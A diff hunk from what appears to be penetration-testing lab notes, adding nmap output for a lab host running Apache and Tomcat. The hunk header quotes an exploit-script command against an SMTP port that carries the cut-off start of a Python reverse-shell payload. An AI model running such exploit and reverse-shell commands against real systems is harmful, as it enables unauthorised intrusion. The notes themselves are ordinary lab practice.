@@ -221,6 +221,19 @@ python3 47984.py 192.168.207.71 25 'python -c "import socket,subprocess,os;s=soc
 sudo nmap -sC -sV -Pn -p- 192.168.207.52 -oN 207.52_allport
 
 # web scan
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Pebbles
+3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-title: Tomcat
+|_http-favicon: Apache Tomcat
+
 
 
 ```
